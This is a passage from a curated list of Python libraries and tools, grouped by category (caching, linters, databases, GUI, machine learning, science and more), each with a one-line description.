Pyramid.\nmezzanine - A powerful, consistent, and flexible content management platform.\nplone - A CMS built on top of the open source application server Zope.\nquokka - Flexible, extensible, small CMS powered by Flask and MongoDB.\n\nCaching\nLibraries for caching data.\n\nbeaker - A WSGI middleware for sessions and caching.\ndjango-cache-machine - Automatic caching and invalidation for Django models.\ndjango-cacheops - A slick ORM cache with automatic granular event-driven invalidation.\ndogpile.cache - dogpile.cache is next generation replacement for Beaker made by same authors.\nHermesCache - Python caching library with tag-based invalidation and dogpile effect prevention.\npylibmc - A Python wrapper around the libmemcached interface.\npython-diskcache - SQLite and file backed cache backend with faster lookups than memcached and redis.\n\nChatOps Tools\nLibraries for chatbot development.\n\nerrbot - The easiest and most popular chatbot to implement ChatOps.\n\nCode Analysis\nTools of static analysis, linters and code quality checkers. See: awesome-static-analysis.\n\nCode Analysis\n\ncoala - Language independent and easily extendable code analysis application.\ncode2flow - Turn your Python and JavaScript code into DOT flowcharts.\nprospector - A tool to analyse Python code.\npycallgraph - A library that visualises the flow (call graph) of your Python application.\n\n\nCode Linters\n\nflake8 - A wrapper around pycodestyle, pyflakes and McCabe.\npylint - A fully customizable source code analyzer.\npylama - A code audit tool for Python and JavaScript.\nCode Formatters\nblack - The uncompromising Python code formatter.\nyapf - Yet another Python code formatter from Google.\n\n\nStatic Type Checkers\n\nmypy - Check variable types during compile time.\npyre-check - Performant type checking.\n\n\nStatic Type Annotations Generators\n\nMonkeyType - A system for Python that generates static type annotations by collecting runtime types\n\n\n\nCommand-line Tools\nLibraries for building command-line application.\n\nCommand-line Application Development\n\ncement - CLI Application Framework for Python.\nclick - A package for creating beautiful command line interfaces in a composable way.\ncliff - A framework for creating command-line programs with multi-level commands.\nclint - Python Command-line Application Tools.\ndocopt - Pythonic command line arguments parser.\npython-fire - A library for creating command line interfaces from absolutely any Python object.\npython-prompt-toolkit - A library for building powerful interactive command lines.\n\n\nTerminal Rendering\n\nasciimatics - A package to create full-screen text UIs (from interactive forms to ASCII animations).\nbashplotlib - Making basic plots in the terminal.\ncolorama - Cross-platform colored terminal text.\n\n\nProductivity Tools\n\ncookiecutter - A command-line utility that creates projects from cookiecutters (project templates).\ndoitlive - A tool for live presentations in the terminal.\nhowdoi - Instant coding answers via the command line.\nPathPicker - Select files out of bash output.\npercol - Adds flavor of interactive selection to the traditional pipe concept on UNIX.\nthefuck - Correcting your previous console command.\ntmuxp - A tmux session manager.\ntry - A dead simple CLI to try out python packages - it's never been easier.\n\n\nCLI Enhancements\n\nhttpie - A command line HTTP client, a user-friendly cURL replacement.\nkube-shell - An integrated shell for working with the Kubernetes CLI.\nmycli - A Terminal Client for MySQL with AutoCompletion and Syntax Highlighting.\npgcli - Postgres CLI with autocompletion and syntax highlighting.\nsaws - A Supercharged aws-cli.\n\n\n\nCompatibility\nLibraries for migrating from Python 2 to 3.\n\npython-future - The missing compatibility layer between Python 2 and Python 3.\npython-modernize - Modernizes Python code for eventual Python 3 migration.\nsix - Python 2 and 3 compatibility utilities.\n\nComputer Vision\nLibraries for computer vision.\n\nOpenCV - Open Source Computer Vision Library.\npytesseract - Another wrapper for Google Tesseract OCR.\nSimpleCV - An open source framework for building computer vision applications.\n\nConcurrency and Parallelism\nLibraries for concurrent and parallel execution. See awesome-asyncio.\n\nconcurrent.futures - (Python standard library) A high-level interface for asynchronously executing callables.\nmultiprocessing - (Python standard library) Process-based parallelism.\neventlet - Asynchronous framework with WSGI support.\ngevent - A coroutine-based Python networking library that uses greenlet.\nuvloop - Ultra fast implementation of asyncio event loop on top of libuv.\nscoop - Scalable Concurrent Operations in Python.\n\nConfiguration\nLibraries for storing and parsing configuration options.\n\nconfigobj - INI file parser with validation.\nconfigparser - (Python standard library) INI file parser.\nprofig - Config from multiple formats with value conversion.\npython-decouple - Strict separation of settings from code.\n\nCryptography\n\ncryptography - A package designed to expose cryptographic primitives and recipes to Python developers.\nparamiko - A Python (2.6+, 3.3+) implementation of the SSHv2 protocol, providing both client and server functionality.\npasslib - Secure password storage/hashing library, very high level.\npynacl - Python binding to the Networking and Cryptography (NaCl) library.\n\nData Analysis\nLibraries for data analyzing.\n\nBlaze - NumPy and Pandas interface to Big Data.\nOpen Mining - Business Intelligence (BI) in Pandas interface.\nOrange - Data mining, data visualization, analysis and machine learning through visual programming or scripts.\nPandas - A library providing high-performance, easy-to-use data structures and data analysis tools.\nOptimus - Cleansing, pre-processing, feature engineering, exploratory data analysis and easy Machine Learning with a PySpark backend.\n\nData Validation\nLibraries for validating data. Used for forms in many cases.\n\nCerberus - A lightweight and extensible data validation library.\ncolander - Validating and deserializing data obtained via XML, JSON, an HTML form post.\nDash - Built on top of Flask, React and Plotly aimed at analytical web applications.\n\nawesome-dash\n\n\njsonschema - An implementation of JSON Schema for Python.\nschema - A library for validating Python data structures.\nSchematics - Data Structure Validation.\nvalideer - Lightweight extensible data validation and adaptation library.\nvoluptuous - A Python data validation library.\n\nData Visualization\nLibraries for visualizing data. See: awesome-javascript.\n\nAltair - Declarative statistical visualization library for Python.\nBokeh - Interactive Web Plotting for Python.\nbqplot - Interactive Plotting Library for the Jupyter Notebook\nggplot - Same API as ggplot2 for R.\nMatplotlib - A Python 2D plotting library.\nPygal - A Python SVG Charts Creator.\nPyGraphviz - Python interface to Graphviz.\nPyQtGraph - Interactive and realtime 2D/3D/Image plotting and science/engineering widgets.\nSeaborn - Statistical data visualization using Matplotlib.\nVisPy - High-performance scientific visualization based on OpenGL.\n\nDatabase\nDatabases implemented in Python.\n\npickleDB - A simple and lightweight key-value store for Python.\ntinydb - A tiny, document-oriented database.\nZODB - A native object database for Python. A key-value and object graph database.\n\nDatabase Drivers\nLibraries for connecting and operating databases.\n\nMySQL - awesome-mysql\n\nmysqlclient - MySQL connector with Python 3 support (mysql-python fork).\nPyMySQL - A pure Python MySQL driver compatible to mysql-python.\n\n\nPostgreSQL - awesome-postgres\n\npsycopg2 - The most popular PostgreSQL adapter for Python.\nqueries - A wrapper of the psycopg2 library for interacting with PostgreSQL.\n\n\nOther Relational Databases\n\npymssql - A simple database interface to Microsoft SQL Server.\n\n\nNoSQL Databases\n\ncassandra-driver - The Python Driver for Apache Cassandra.\nhappybase - A developer-friendly library for Apache HBase.\nkafka-python - The Python client for Apache Kafka.\npy2neo - Python wrapper client for Neo4j's restful interface.\npymongo - The official Python client for MongoDB.\nredis-py - The Python client for Redis.\n\n\nAsynchronous Clients\n\nmotor - The async Python driver for MongoDB.\nTelephus - Twisted based client for Cassandra.\ntxpostgres - Twisted based asynchronous driver for PostgreSQL.\ntxRedis - Twisted based client for Redis.\n\n\n\nDate and Time\nLibraries for working with dates and times.\n\nChronyk - A Python 3 library for parsing human-written times and dates.\ndateutil - Extensions to the standard Python datetime module.\ndelorean - A library for clearing up the inconvenient truths that arise dealing with datetimes.\nmoment - A Python library for dealing with dates/times. Inspired by Moment.js.\nPendulum - Python datetimes made easy.\nPyTime - A easy-use Python module which aims to operate date/time/datetime by string.\npytz - World timezone definitions, modern and historical. Brings the tz database into Python.\nwhen.py - Providing user-friendly functions to help perform common date and time actions.\nmaya - Datetimes for Humans, Maya is mostly built around the headaches and use-cases around parsing datetime data from websites.\n\nDebugging Tools\nLibraries for debugging code.\n\npdb-like Debugger\n\nipdb - IPython-enabled pdb.\npdb++ - Another drop-in replacement for pdb.\npudb - A full-screen, console-based Python debugger.\nwdb - An improbable web debugger through WebSockets.\n\n\nTracing\n\nlptrace - strace for Python programs.\nmanhole - Debug service that will accept unix domain socket connections and present the stacktraces for all threads and an interactive prompt.\npyringe - Debugger capable of attaching to and injecting code into Python processes.\npython-hunter - A flexible code tracing toolkit.\n\n\nProfiler\n\nline_profiler - Line-by-line profiling.\nmemory_profiler - Monitor Memory usage of Python code.\nprofiling - An interactive Python profiler.\npy-spy - A sampling profiler for Python programs. Written in Rust.\npyflame - A ptracing profiler For Python.\nvprof - Visual Python profiler.\n\n\nOthers\n\nicecream - Inspect variables, expressions, and program execution with a single, simple function call.\ndjango-debug-toolbar - Display various debug information for Django.\ndjango-devserver - A drop-in replacement for Django's runserver.\nflask-debugtoolbar - A port of the django-debug-toolbar to flask.\npyelftools - Parsing and analyzing ELF files and DWARF debugging information.\n\n\n\nDeep Learning\nFrameworks for Neural Networks and Deep Learning. See: awesome-deep-learning.\n\ncaffe - A fast open framework for deep learning..\nkeras - A high-level neural networks library and capable of running on top of either TensorFlow or Theano.\nmxnet - A deep learning framework designed for both efficiency and flexibility.\npytorch - Tensors and Dynamic neural networks in Python with strong GPU acceleration.\nSerpentAI - Game agent framework. Use any video game as a deep learning sandbox.\ntensorflow - The most popular Deep Learning framework created by Google.\nTheano - A library for fast numerical computation.\n\nDevOps Tools\nSoftware and libraries for DevOps.\n\nansible - A radically simple IT automation platform.\ncloudinit - A multi-distribution package that handles early initialization of a cloud instance.\ncuisine - Chef-like functionality for Fabric.\ndocker-compose - Fast, isolated development environments using Docker.\nfabric - A simple, Pythonic tool for remote execution and deployment.\nfabtools - Tools for writing awesome Fabric files.\nhoncho - A Python clone of Foreman, for managing Procfile-based applications.\nOpenStack - Open source software for building private and public clouds.\npexpect - Controlling interactive programs in a pseudo-terminal like GNU expect.\npsutil - A cross-platform process and system utilities module.\nsaltstack - Infrastructure automation and management system.\nsupervisor - Supervisor process control system for UNIX.\n\nDistributed Computing\nFrameworks and libraries for Distributed Computing.\n\nBatch Processing\n\nPySpark - Apache Spark Python API.\ndask - A flexible parallel computing library for analytic computing.\nluigi - A module that helps you build complex pipelines of batch jobs.\nmrjob - Run MapReduce jobs on Hadoop or Amazon Web Services.\nRay - A system for parallel and distributed Python that unifies the machine learning ecosystem.\n\n\nStream Processing\n\nfaust - A stream processing library, porting the ideas from Kafka Streams to Python.\nstreamparse - Run Python code against real-time streams of data via Apache Storm.\n\n\n\nDistribution\nLibraries to create packaged executables for release distribution.\n\ndh-virtualenv - Build and distribute a virtualenv as a Debian package.\nNuitka - Compile scripts, modules, packages to an executable or extension module.\npy2app - Freezes Python scripts (Mac OS X).\npy2exe - Freezes Python scripts (Windows).\nPyInstaller - Converts Python programs into stand-alone executables (cross-platform).\npynsist - A tool to build Windows installers, installers bundle Python itself.\n\nDocumentation\nLibraries for generating project documentation.\n\nsphinx - Python Documentation generator.\n\nawesome-sphinxdoc\n\n\npdoc - Epydoc replacement to auto generate API documentation for Python libraries.\npycco - The literate-programming-style documentation generator.\n\nDownloader\nLibraries for downloading.\n\ns3cmd - A command line tool for managing Amazon S3 and CloudFront.\ns4cmd - Super S3 command line tool, good for higher performance.\nyou-get - A YouTube/Youku/Niconico video downloader written in Python 3.\nyoutube-dl - A small command-line program to download videos from YouTube.\n\nE-commerce\nFrameworks and libraries for e-commerce and payments.\n\nalipay - Unofficial Alipay API for Python.\nCartridge - A shopping cart app built using the Mezzanine.\ndjango-oscar - An open-source e-commerce framework for Django.\ndjango-shop - A Django based shop system.\nmerchant - A Django app to accept payments from various payment processors.\nmoney - Money class with optional CLDR-backed locale-aware formatting and an extensible currency exchange solution.\npython-currencies - Display money format and its filthy currencies.\nforex-python - Foreign exchange rates, Bitcoin price index and currency conversion.\nsaleor - An e-commerce storefront for Django.\nshoop - An open source E-Commerce platform based on Django.\n\nEditor Plugins and IDEs\n\nEmacs\n\nelpy - Emacs Python Development Environment.\n\n\nSublime Text\n\nanaconda - Anaconda turns your Sublime Text 3 in a full featured Python development IDE.\nSublimeJEDI - A Sublime Text plugin to the awesome auto-complete library Jedi.\n\n\nVim\n\njedi-vim - Vim bindings for the Jedi auto-completion library for Python.\npython-mode - An all in one plugin for turning Vim into a Python IDE.\nYouCompleteMe - Includes Jedi-based completion engine for Python.\n\n\nVisual Studio\n\nPTVS - Python Tools for Visual Studio.\n\n\nVisual Studio Code\n\nPython - An extension with rich support for the Python language, with features including linting, IntelliSense, formatting, refactoring, debugging, unit tests, and jupyter support.\n\n\nIDE\n\nPyCharm - Commercial Python IDE by JetBrains. Has free community edition available.\nspyder - Open Source Python IDE.\n\n\n\nEmail\nLibraries for sending and parsing email.\n\nenvelopes - Mailing for human beings.\nflanker - A email address and Mime parsing library.\nimbox - Python IMAP for Humans.\ninbox.py - Python SMTP Server for Humans.\nlamson - Pythonic SMTP Application Server.\nMarrow Mailer - High-performance extensible mail delivery framework.\nmodoboa - A mail hosting and management platform including a modern and simplified Web UI.\nNylas Sync Engine - Providing a RESTful API on top of a powerful email sync platform.\nyagmail - Yet another Gmail/SMTP client.\n\nEnvironment Management\nLibraries for Python version and environment management.\n\npipenv - Sacred Marriage of Pipfile, Pip, & Virtualenv.\npoetry - Python dependency management and packaging made easy.\npyenv - Simple Python version management.\nvenv - (Python standard library in Python 3.3+) Creating lightweight virtual environments.\nvirtualenv - A tool to create isolated Python environments.\n\nFiles\nLibraries for file manipulation and MIME type detection.\n\nmimetypes - (Python standard library) Map filenames to MIME types.\npath.py - A module wrapper for os.path.\npathlib - (Python standard library) An cross-platform, object-oriented path library.\nPyFilesystem2 - Python's filesystem abstraction layer.\npython-magic - A Python interface to the libmagic file type identification library.\nUnipath - An object-oriented approach to file/directory operations.\nwatchdog - API and shell utilities to monitor file system events.\n\nForeign Function Interface\nLibraries for providing foreign function interface.\n\ncffi - Foreign Function Interface for Python calling C code.\nctypes - (Python standard library) Foreign Function Interface for Python calling C code.\nPyCUDA - A Python wrapper for Nvidia's CUDA API.\nSWIG - Simplified Wrapper and Interface Generator.\n\nForms\nLibraries for working with forms.\n\nDeform - Python HTML form generation library influenced by the formish form generation library.\ndjango-bootstrap3 - Bootstrap 3 integration with Django.\ndjango-bootstrap4 - Bootstrap 4 integration with Django.\ndjango-crispy-forms - A Django app which lets you create beautiful forms in a very elegant and DRY way.\ndjango-remote-forms - A platform independent Django form serializer.\nWTForms - A flexible forms validation and rendering library.\n\nFunctional Programming\nFunctional Programming with Python.\n\nCoconut - Coconut is a variant of Python built for simple, elegant, Pythonic functional programming.\nCyToolz - Cython implementation of Toolz: High performance functional utilities.\nfn.py - Functional programming in Python: implementation of missing features to enjoy FP.\nfuncy - A fancy and practical functional tools.\nToolz - A collection of functional utilities for iterators, functions, and dictionaries.\n\nGUI\nLibraries for working with graphical user interface applications.\n\ncurses - Built-in wrapper for ncurses used to create terminal GUI applications.\nEel - Little library for making simple Electron-like offline HTML/JS GUI apps, with full access to Python capabilities and libraries.\nenaml - Creating beautiful user-interfaces with Declaratic Syntax like QML.\nFlexx - Flexx is a pure Python toolkit for creating GUI's, that uses web technology for its rendering.\nGooey - Turn command line programs into a full GUI application with one line.\nkivy - A library for creating NUI applications, running on Windows, Linux, Mac OS X, Android and iOS.\npyglet - A cross-platform windowing and multimedia library for Python.\nPyGObject - Python Bindings for GLib/GObject/GIO/GTK+ (GTK+3).\nPyQt - Python bindings for the Qt cross-platform application and UI framework, with support for both Qt v4 and Qt v5 frameworks.\nPySide - Python bindings for the Qt cross-platform application and UI framework, supporting the Qt v4 framework.\nPySimpleGUI - Wrapper for tkinter, Qt, WxPython and Remi that creates a unified, easy to understand & more Python-like interface for beginner and intermediate level custom GUIs.\npywebview - A lightweight cross-platform native wrapper around a webview component that allows to display HTML content in its own native dedicated window.\nTkinter - Tkinter is Python's de-facto standard GUI package.\nToga - A Python native, OS native GUI toolkit.\nurwid - A library for creating terminal GUI applications with strong support for widgets, events, rich colors, etc.\nwxPython - A blending of the wxWidgets C++ class library with the Python.\n\nGame Development\nAwesome game development libraries.\n\nCocos2d - cocos2d is a framework for building 2D games, demos, and other graphical/interactive applications. It is based on pyglet.\nHarfang3D - Python framework for 3D, VR and game development. Manage and display complex 3D scenes, with physics, video, sound and music, access VR devices. All written in C++.\nPanda3D - 3D game engine developed by Disney and maintained by Carnegie Mellon's Entertainment Technology Center. Written in C++, completely wrapped in Python.\nPygame - Pygame is a set of Python modules designed for writing games.\nPyOgre - Python bindings for the Ogre 3D render engine, can be used for games, simulations, anything 3D.\nPyOpenGL - Python ctypes bindings for OpenGL and it's related APIs.\nPySDL2 - A ctypes based wrapper for the SDL2 library.\nRenPy - A Visual Novel engine.\n\nGeolocation\nLibraries for geocoding addresses and working with latitudes and longitudes.\n\ndjango-countries - A Django app that provides country choices for use with forms, flag icons static files, and a country field for models.\nGeoDjango - A world-class geographic web framework.\nGeoIP - Python API for MaxMind GeoIP Legacy Database.\ngeojson - Python bindings and utilities for GeoJSON.\ngeopy - Python Geocoding Toolbox.\npygeoip - Pure Python GeoIP API.\n\nHTML Manipulation\nLibraries for working with HTML and XML.\n\nBeautifulSoup - Providing Pythonic idioms for iterating, searching, and modifying HTML or XML.\nbleach - A whitelist-based HTML sanitization and text linkification library.\ncssutils - A CSS library for Python.\nhtml5lib - A standards-compliant library for parsing and serializing HTML documents and fragments.\nlxml - A very fast, easy-to-use and versatile library for handling HTML and XML.\nMarkupSafe - Implements a XML/HTML/XHTML Markup safe string for Python.\npyquery - A jQuery-like library for parsing HTML.\nuntangle - Converts XML documents to Python objects for easy access.\nWeasyPrint - A visual rendering engine for HTML and CSS that can export to PDF.\nxmldataset - Simple XML Parsing.\nxmltodict - Working with XML feel like you are working with JSON.\n\nHTTP\nLibraries for working with HTTP.\n\ngrequests - requests + gevent for asynchronous HTTP requests.\nhttplib2 - Comprehensive HTTP client library.\nrequests - HTTP Requests for Humans\u2122.\ntreq - Python requests like API built on top of Twisted's HTTP client.\nurllib3 - A HTTP library with thread-safe connection pooling, file post support, sanity friendly.\n\nHardware\nLibraries for programming with hardware.\n\nino - Command line toolkit for working with Arduino.\nkeyboard - Hook and simulate global keyboard events on Windows and Linux.\nmouse - Hook and simulate global mouse events on Windows and Linux.\nPingo - Pingo provides a uniform API to program devices like the Raspberry Pi, pcDuino, Intel Galileo, etc.\nPyUserInput - A module for cross-platform control of the mouse and keyboard.\nscapy - A brilliant packet manipulation library.\nwifi - A Python library and command line tool for working with WiFi on Linux.\n\nImage Processing\nLibraries for manipulating images.\n\nhmap - Image histogram remapping.\nimgSeek - A project for searching a collection of images using visual similarity.\nnude.py - Nudity detection.\npagan - Retro identicon (Avatar) generation based on input string and hash.\npillow - Pillow is the friendly PIL fork.\npyBarcode - Create barcodes in Python without needing PIL.\npygram - Instagram-like image filters.\npython-qrcode - A pure Python QR Code generator.\nQuads - Computer art based on quadtrees.\nscikit-image - A Python library for (scientific) image processing.\nthumbor - A smart imaging service. It enables on-demand crop, re-sizing and flipping of images.\nwand - Python bindings for MagickWand, C API for ImageMagick.\n\nImplementations\nImplementations of Python.\n\nCLPython - Implementation of the Python programming language written in Common Lisp.\nCPython - Default, most widely used implementation of the Python programming language written in C.\nCython - Optimizing Static Compiler for Python. Uses type mixins to compile Python into C or C++ modules resulting in large performance gains\nGrumpy - More compiler than interpreter as more powerful CPython2.7 replacement (alpha).\nIronPython - Implementation of the Python programming language written in C# targeting the .NET Framework and Mono.\nJython - Implementation of Python programming language written in Java for the Java virtual machine (JVM).\nMicroPython - MicroPython - a lean and efficient Python programming language implementation for microcontrollers and constrained systems\nNumba - Python JIT compiler to LLVM aimed at scientific Python.\nPeachPy - x86-64 assembler embedded in Python. Can be used as inline assembler for Python or as a stand-alone assembler for Windows, Linux, OS X, Native Client and Go.\nPyjion - A JIT for Python based upon CoreCLR.\nPyPy - Implementation of the Python programming language written in RPython and translated into C. PyPy focuses on speed, efficiency and compatibility with the original CPython interpreter. The interpreter uses black magic to make Python very fast without having to add in additional type information.\nPySec - Hardened version of python that makes it easier for security professionals and developers to write applications more resilient to attacks and manipulations.\nPyston - A Python implementation built using LLVM and modern JIT techniques with the goal of achieving good performance.\nStackless Python - An enhanced version of the Python programming language which allows programmers to reap the benefits of thread-based programming without the performance and complexity problems associated with conventional threads.\n\nInteractive Interpreter\nInteractive Python interpreters (REPL).\n\nbpython - A fancy interface to the Python interpreter.\nJupyter Notebook (IPython) - A rich toolkit to help you make the most out of using Python interactively.\n\nawesome-jupyter\n\n\nptpython - Advanced Python REPL built on top of the python-prompt-toolkit.\n\nInternationalization\nLibraries for working with i18n.\n\nBabel - An internationalization library for Python.\nPyICU - A wrapper of International Components for Unicode C++ library (ICU).\n\nJob Scheduler\nLibraries for scheduling jobs.\n\nAPScheduler - A light but powerful in-process task scheduler that lets you schedule functions.\ndjango-schedule - A calendaring app for Django.\ndoit - A task runner and build tool.\ngunnery - Multipurpose task execution tool for distributed systems with web-based interface.\nJoblib - A set of tools to provide lightweight pipelining in Python.\nPlan - Writing crontab file in Python like a charm.\nschedule - Python job scheduling for humans.\nSpiff - A powerful workflow engine implemented in pure Python.\nTaskFlow - A Python library that helps to make task execution easy, consistent and reliable.\nAirflow - Airflow is a platform to programmatically author, schedule and monitor workflows.\n\nLogging\nLibraries for generating and working with logs.\n\nEliot - Logging for complex & distributed systems.\nlogbook - Logging replacement for Python.\nlogging - (Python standard library) Logging facility for Python.\nraven - Python client for Sentry, a log/error tracking, crash reporting and aggregation platform for web applications.\n\nMachine Learning\nLibraries for Machine Learning. See: awesome-machine-learning.\n\nH2O - Open Source Fast Scalable Machine Learning Platform.\nMetrics - Machine learning evaluation metrics.\nNuPIC - Numenta Platform for Intelligent Computing.\nscikit-learn - The most popular Python library for Machine Learning.\nSpark ML - Apache Spark's scalable Machine Learning library.\nvowpal_porpoise - A lightweight Python wrapper for Vowpal Wabbit.\nxgboost - A scalable, portable, and distributed gradient boosting library.\n\nMicrosoft Windows\nPython programming on Microsoft Windows.\n\nPython(x,y) - Scientific-applications-oriented Python Distribution based on Qt and Spyder.\npythonlibs - Unofficial Windows binaries for Python extension packages.\nPythonNet - Python Integration with the .NET Common Language Runtime (CLR).\nPyWin32 - Python Extensions for Windows.\nWinPython - Portable development environment for Windows 7/8.\n\nMiscellaneous\nUseful libraries or tools that don't fit in the categories above.\n\nblinker - A fast Python in-process signal/event dispatching system.\nboltons - A set of pure-Python utilities.\nitsdangerous - Various helpers to pass trusted data to untrusted environments.\npluginbase - A simple but flexible plugin system for Python.\ntryton - A general purpose business framework.\n\nNatural Language Processing\nLibraries for working with human languages.\n\nGeneral\n\ngensim - Topic Modelling for Humans.\nlangid.py - Stand-alone language identification system.\nnltk - A leading platform for building Python programs to work with human language data.\npattern - A web mining module for the Python.\npolyglot - Natural language pipeline supporting hundreds of languages.\npytext - A natural language modeling framework based on PyTorch.\nPyTorch-NLP - A toolkit enabling rapid deep learning NLP prototyping for research.\nspacy - A library for industrial-strength natural language processing in Python and Cython.\nstanfordnlp - The Stanford NLP Group's official Python library, supporting 50+ languages.\n\n\nChinese\n\njieba - The most popular Chinese text segmentation library.\npkuseg-python - A toolkit for Chinese word segmentation in various domains.\nsnownlp - A library for processing Chinese text.\nfunNLP - A collection of tools and datasets for Chinese NLP.\n\n\n\nNetwork Virtualization\nTools and libraries for Virtual Networking and SDN (Software Defined Networking).\n\nmininet - A popular network emulator and API written in Python.\npox - A Python-based SDN control applications, such as OpenFlow SDN controllers.\n\nNetworking\nLibraries for networking programming.\n\nasyncio - (Python standard library) Asynchronous I/O, event loop, coroutines and tasks.\n\nawesome-asyncio\n\n\npulsar - Event-driven concurrent framework for Python.\npyzmq - A Python wrapper for the ZeroMQ message library.\nTwisted - An event-driven networking engine.\nnapalm - Cross-vendor API to manipulate network devices.\n\nNews Feed\nLibraries for building user's activities.\n\ndjango-activity-stream - Generating generic activity streams from the actions on your site.\nStream Framework - Building newsfeed and notification systems using Cassandra and Redis.\n\nORM\nLibraries that implement Object-Relational Mapping or data mapping techniques.\n\nRelational Databases\n\nDjango Models - A part of Django.\nSQLAlchemy - The Python SQL Toolkit and Object Relational Mapper.\n\nawesome-sqlalchemy\n\n\ndataset - Store Python dicts in a database - works with SQLite, MySQL, and PostgreSQL.\norator -  The Orator ORM provides a simple yet beautiful ActiveRecord implementation.\npeewee - A small, expressive ORM.\npony - ORM that provides a generator-oriented interface to SQL.\npydal - A pure Python Database Abstraction Layer.\n\n\nNoSQL Databases\n\nhot-redis - Rich Python data types for Redis.\nmongoengine - A Python Object-Document-Mapper for working with MongoDB.\nPynamoDB - A Pythonic interface for Amazon DynamoDB.\nredisco - A Python Library for Simple Models and Containers Persisted in Redis.\n\n\n\nPackage Management\nLibraries for package and dependency management.\n\npip - The Python package and dependency manager.\n\nPyPI\npip-tools - A set of tools to keep your pinned Python dependencies fresh.\n\n\nconda - Cross-platform, Python-agnostic binary package manager.\n\nPackage Repositories\nLocal PyPI repository server and proxies.\n\nwarehouse - Next generation Python Package Repository (PyPI).\nbandersnatch - PyPI mirroring tool provided by Python Packaging Authority (PyPA).\ndevpi - PyPI server and packaging/testing/release tool.\nlocalshop - Local PyPI server (custom packages and auto-mirroring of pypi).\n\nPermissions\nLibraries that allow or deny users access to data or functionality.\n\ndjango-guardian - Implementation of per object permissions for Django 1.2+\ndjango-rules - A tiny but powerful app providing object-level permissions to Django, without requiring a database.\n\nProcesses\nLibraries for starting and communicating with OS processes.\n\ndelegator.py - Subprocesses for Humans\u2122 2.0.\nsarge - Yet another wrapper for subprocess.\nsh - A full-fledged subprocess replacement for Python.\n\nQueue\nLibraries for working with event and task queues.\n\ncelery - An asynchronous task queue/job queue based on distributed message passing.\nhuey - Little multi-threaded task queue.\nmrq - Mr. Queue - A distributed worker task queue in Python using Redis & gevent.\nrq - Simple job queues for Python.\n\nRecommender Systems\nLibraries for building recommender systems.\n\nannoy - Approximate Nearest Neighbors in C++/Python optimized for memory usage.\nfastFM - A library for Factorization Machines.\nimplicit - A fast Python implementation of collaborative filtering for implicit datasets.\nlibffm - A library for Field-aware Factorization Machine (FFM).\nlightfm - A Python implementation of a number of popular recommendation algorithms.\nspotlight - Deep recommender models using PyTorch.\nSurprise - A scikit for building and analyzing recommender systems.\ntensorrec - A Recommendation Engine Framework in TensorFlow.\n\nRESTful API\nLibraries for developing RESTful APIs.\n\nDjango\n\ndjango-rest-framework - A powerful and flexible toolkit to build web APIs.\ndjango-tastypie - Creating delicious APIs for Django apps.\n\n\nFlask\n\neve - REST API framework powered by Flask, MongoDB and good intentions.\nflask-api-utils - Taking care of API representation and authentication for Flask.\nflask-api - Browsable Web APIs for Flask.\nflask-restful - Quickly building REST APIs for Flask.\nflask-restless - Generating RESTful APIs for database models defined with SQLAlchemy.\n\n\nPyramid\n\ncornice - A RESTful framework for Pyramid.\n\n\nFramework agnostic\n\napistar - A smart Web API framework, designed for Python 3.\nfalcon - A high-performance framework for building cloud APIs and web app backends.\nhug - A Python3 framework for cleanly exposing APIs over HTTP and the Command Line with automatic documentation and validation.\nrestless - Framework agnostic REST framework based on lessons learned from Tastypie.\nripozo - Quickly creating REST/HATEOAS/Hypermedia APIs.\nsandman - Automated REST APIs for existing database-driven systems.\n\n\n\nRobotics\nLibraries for robotics.\n\nPythonRobotics - This is a compilation of various robotics algorithms with visualizations.\nrospy - This is a library for ROS (Robot Operating System).\n\nRPC Servers\nRPC-compatible servers.\n\nSimpleJSONRPCServer - This library is an implementation of the JSON-RPC specification.\nSimpleXMLRPCServer - (Python standard library) Simple XML-RPC server implementation, single-threaded.\nzeroRPC - zerorpc is a flexible RPC implementation based on ZeroMQ and MessagePack.\n\nScience\nLibraries for scientific computing.\n\nastropy - A community Python library for Astronomy.\nbcbio-nextgen - Providing best-practice pipelines for fully automated high throughput sequencing analysis.\nbccb - Collection of useful code related to biological analysis.\nBiopython - Biopython is a set of freely available tools for biological computation.\ncclib - A library for parsing and interpreting the results of computational chemistry packages.\nColour - A colour science package implementing a comprehensive number of colour theory transformations and algorithms.\nNetworkX - A high-productivity software for complex networks.\nNIPY - A collection of neuroimaging toolkits.\nNumPy - A fundamental package for scientific computing with Python.\nOpen Babel - A chemical toolbox designed to speak the many languages of chemical data.\nObsPy - A Python toolbox for seismology.\nPyDy - Short for Python Dynamics, used to assist with workflow in the modeling of dynamic motion.\nPyMC - Markov Chain Monte Carlo sampling toolkit.\nQuTiP - Quantum Toolbox in Python.\nRDKit - Cheminformatics and Machine Learning Software.\nSciPy - A Python-based ecosystem of open-source software for mathematics, science, and engineering.\nstatsmodels - Statistical modeling and econometrics in Python.\nSymPy - A Python library for symbolic mathematics.\nZipline - A Pythonic algorithmic trading library.\nSimPy -  A process-based discrete-event simulation framework.\n\nSearch\nLibraries and software for indexing and performing search queries on data.\n\nelasticsearch-py - The official low-level Python client for Elasticsearch.\nelasticsearch-dsl-py - The official high-level Python client for Elasticsearch.\ndjango-haystack - Modular search for Django.\npysolr - A lightweight Python wrapper for Apache Solr.\nwhoosh - A fast, pure Python search engine library.\n\nSerialization\nLibraries for serializing complex data types\n\nmarshmallow - A lightweight library for converting complex objects to and from simple Python datatypes.\npysimdjson - A Python bindings for simdjson.\npython-rapidjson - A Python wrapper around RapidJSON.\n\nServerless Frameworks\nFrameworks for developing serverless Python code.\n\npython-lambda - A toolkit for developing and deploying Python code in AWS Lambda.\nZappa - A tool for deploying WSGI applications on AWS Lambda and API Gateway.\n\nSpecific Formats Processing\nLibraries for parsing and manipulating specific text formats.\n\nGeneral\n\ntablib - A module for Tabular Datasets in XLS, CSV, JSON, YAML.\n\n\nOffice\n\nopenpyxl - A library for reading and writing Excel 2010 xlsx/xlsm/xltx/xltm files.\npyexcel - Providing one API for reading, manipulating and writing csv, ods, xls, xlsx and xlsm files.\npython-docx - Reads, queries and modifies Microsoft Word 2007/2008 docx files.\npython-pptx - Python library for creating and updating PowerPoint (.pptx) files.\nunoconv - Convert between any document format supported by LibreOffice/OpenOffice.\nXlsxWriter - A Python module for creating Excel .xlsx files.\nxlwings - A BSD-licensed library that makes it easy to call Python from Excel and vice versa.\nxlwt / xlrd - Writing and reading data and formatting information from Excel files.\n\n\nPDF\n\nPDFMiner - A tool for extracting information from PDF documents.\nPyPDF2 - A library capable of splitting, merging and transforming PDF pages.\nReportLab - Allowing Rapid creation of rich PDF documents.\n\n\nMarkdown\n\nMistune 